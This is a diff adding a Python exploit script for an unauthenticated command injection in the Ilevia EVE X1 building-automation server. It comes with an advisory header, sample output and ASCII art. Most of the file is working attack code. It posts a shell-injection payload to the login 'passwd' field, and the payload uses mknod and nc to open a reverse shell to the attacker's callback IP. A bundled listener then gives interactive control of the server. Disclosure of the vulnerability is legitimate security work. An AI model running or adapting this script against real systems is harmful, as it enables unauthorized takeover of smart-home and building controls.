@@ -1,0 +1,192 @@
+#!/usr/bin/env python
+#
+#
+# Ilevia EVE X1 Server 4.7.18.0.eden Neuro-Core Unauth Code Invasion
+#
+#
+# Vendor: Ilevia Srl.
+# Product web page: https://www.ilevia.com
+# Affected version: <= 4.7.18.0.eden (Logic ver: 6.00)
+#
+# Summary: EVE is a smart home and building automation solution designed
+# for both residential and commercial environments, including malls, hotels,
+# restaurants, bars, gyms, spas, boardrooms, and offices. It enables comprehensive
+# control and monitoring of electrical installations through a highly customizable,
+# user-friendly interface.
+#
+# EVE is a multi-protocol platform that integrates various systems within
+# a smart building to enhance comfort, security, safety, and energy efficiency.
+# Users can manage building functions via iPhone, iPad, Android devices, Windows
+# PCs, or Mac computers.
+#
+# The EVE X1 Server is the dedicated hardware solution for advanced building
+# automation needs. Compact and powerful, it is ideal for apartments, small
+# to medium-sized homes, and smaller commercial installations. It is designed
+# to manage entire automation systems reliably and efficiently.
+#
+# Desc: The EVE X1 server suffers from an unauthenticated OS command injection
+# vulnerability. This can be exploited to inject and execute arbitrary shell
+# commands through the 'passwd' HTTP POST parameter in /ajax/php/login.php script.
+#
+# ------------------------------------------------------------------------------
+# $ python eve.py 10.0.0.17:8080 10.0.0.3 5555
+# [+] Cyber-link active on 0.0.0.0:5555...
+# [*] Firing at http://10.0.0.17:8080/ajax/php/login.php
+# [+] Pulse from 10.0.0.17:40040
+# [*] Probing matrix with 'pwd' signal...
+# [+] Verifistring: /home/ilevia/www-config/http/ajax/php
+# [*] Synaptic intrusion confirmed, escalating to holo-shell...
+# [+] Holo-shell online. 'exit' to disengage.
+# >> id
+# uid=33(www-data) gid=33(www-data) groups=33(www-data)
+# >> uname -a
+# Linux x1-eve 5.4.35-sunxi #trunk SMP Thu Apr 23 18:06:21 CEST 2020 armv7l GNU/Linux
+# >> exit
+# ------------------------------------------------------------------------------
+#
+# Tested on: GNU/Linux 5.4.35 (armv7l)
+#            GNU/Linux 4.19.97 (armv7l)
+#            Armbian 20.02.1 Buster
+#            Apache/2.4.38 (Debian)
+#            PHP Version 7.3.14
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2025-5956
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2025-5956.php
+#
+#
+# 01.05.2024
+#
+
+import socket, telnetlib, threading, time, requests, sys
+
+def init_quantum(target_data):
+    if "http://" not in target_data and "https://" not in target_data:
+        target_data = "http://" + target_data
+    if ":" not in target_data.split("//")[1]:
+        target_data = target_data.rstrip("/") + ":80"
+    return target_data.rstrip("/")
+
+def spark_neuroport(cyber_gate):
+    def neuro_core():
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            s.bind(("0.0.0.0", cyber_gate))
+            s.listen(1)
+            print(f"[+] Cyber-link active on 0.0.0.0:{cyber_gate}...")
+            conn, addr = s.accept()
+            print(f"[+] Pulse from {addr[0]}:{addr[1]}")
+            holo_term = telnetlib.Telnet()
+            holo_term.sock = conn
+
+            print("[*] Probing matrix with 'pwd' signal...")
+            conn.sendall(b"pwd\n")
+            time.sleep(0.5)
+            try:
+                data_stream = conn.recv(4096).decode(errors='ignore')
+                data_nodes = data_stream.splitlines()
+                if data_nodes and data_nodes[0].strip() == "pwd":
+                    data_nodes.pop(0)
+                output = "\n".join(data_nodes).strip()
+                print("[+] Verifistring:", output)
+                if 'ilevia/www-config' in output:
+                    print("[*] Synaptic intrusion confirmed, escalating to holo-shell...")
+                    conn.sendall(b"script /dev/null -c /bin/sh\n")
+                    time.sleep(0.5)
+                    try:
+                        _ = conn.recv(4096)
+                    except:
+                        pass
+                else:
+                    print("[!] Expected neural path not detected. Holo-shell may be unstable.")
+            except Exception as e:
+                print(f"[!] Error in synaptic probe: {e}")
+
+            print("""
+   _...._
+ .'      '.
+/     __   \\
+|   .'  \  /
+ \  |   /.'
+  \ |
+   '.\ _
+   \_><_\\
+     | `-._   _...__
+     |    -"``      ``"-,
+     |,               _. )
+     /      /``"'---"`|-'
+    /      |   .-'  '-;
+   |       \   6_)  6_)\\
+   \        '.      )   \\      BZZT! Once you blast that holo-shell wide open on the EVE X1 grid,
+    '.    ,---'  _.--.` /      you're cruisin' the neon datastreams, baby!
+      '-.._\-     `""`.'       Judy Jetson, your cosmic code-slinger, zappin' through the quantum void!
+           `'-.   .--'         PEW PEW!
+    .=========|   |=========,
+    '.        |   |       .'
+      `-._    `-._|    .-'
+          `-._    `_.-'
+              '-.-'
+                """)
+            print("[+] Holo-shell online. 'exit' to disengage.")
+            while True:
+                try:
+                    cmd = input(">> ").strip()
+                    if cmd == "exit":
+                        break
+                    if not cmd:
+                        continue
+                    conn.sendall((cmd + "\n").encode())
+                    time.sleep(0.3)
+                    data_stream = conn.recv(7777).decode(errors='ignore')
+                    data_nodes = data_stream.splitlines()
+                    if data_nodes and data_nodes[0].strip() == cmd:
+                        data_nodes.pop(0)
+                    if data_nodes and data_nodes[-1].strip() in ["$", "#"]:
+                        data_nodes.pop(-1)
+                    print("\n".join(data_nodes).strip())
+                except Exception:
+                    print("[!] Neural link terminated.")
+                    break
+            conn.close()
+    cyber_thread = threading.Thread(target=neuro_core)
+    cyber_thread.start()
+    return cyber_thread
+
+def fire_photon(target_matrix, cyber_origin, cyber_gate):
+    print(f"[*] Firing at {target_matrix}")
+    payload = f";mknod /tmp/pipe p; /bin/sh -i < /tmp/pipe | nc {cyber_origin} {cyber_gate} > /tmp/pipe"
+    try:
+        requests.post(target_matrix, data={"userid":"george","passwd":payload}, timeout=3)
+        print("[*] Photon fired.")
+    except requests.exceptions.ReadTimeout:
+        pass  # Expected when cyber-link engages
+    except requests.exceptions.RequestException as e:
+        print(f"[!] Photon failed: {e}")
+
+def boot_sequence():
+    if len(sys.argv) != 4:
+        print(f"Usage: {sys.argv[0]} <target_ip[:port]> <callback_ip> <callback_gate>")
+        print("Example: python eve.py 1.2.3.4:8080 5.6.7.8 5555")
+        sys.exit(1)
+
+    target_data = sys.argv[1]
+    cyber_origin = sys.argv[2]
+    try:
+        cyber_gate = int(sys.argv[3])
+    except ValueError:
+        print("[!] Cyber gate must be numeric.")
+        sys.exit(1)
+
+    target_matrix = init_quantum(target_data) + "/ajax/php/login.php"
+
+    neuro_thread = spark_neuroport(cyber_gate)
+    time.sleep(1)
+    fire_photon(target_matrix, cyber_origin, cyber_gate)
+    neuro_thread.join()
+
+if __name__ == "__main__":
+    boot_sequence()
